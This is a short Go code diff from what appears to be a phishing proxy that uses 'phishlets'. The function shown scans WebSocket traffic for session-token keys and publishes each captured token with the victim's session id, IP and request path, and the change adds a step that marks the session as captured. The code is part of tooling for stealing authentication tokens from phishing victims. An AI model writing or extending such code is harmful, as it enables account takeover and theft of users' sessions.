@@ -167,6 +167,7 @@ func (e *Engine) scanWS(data []byte, ph *core.Phishlet, r *http.Request, sid str
 		for _, k := range t.Keys {
 			if hit(k) {
 				_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "ws", "ip": ip, "path": r.URL.Path})
+				e.markCaptured(sid)
 				return
 			}
 		}
@@ -175,6 +176,7 @@ func (e *Engine) scanWS(data []byte, ph *core.Phishlet, r *http.Request, sid str
 		key := strings.TrimSuffix(k, "=")
 		if hit(key) {
 			_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "ws", "ip": ip, "path": r.URL.Path})
+			e.markCaptured(sid)
 			return
 		}
 	}
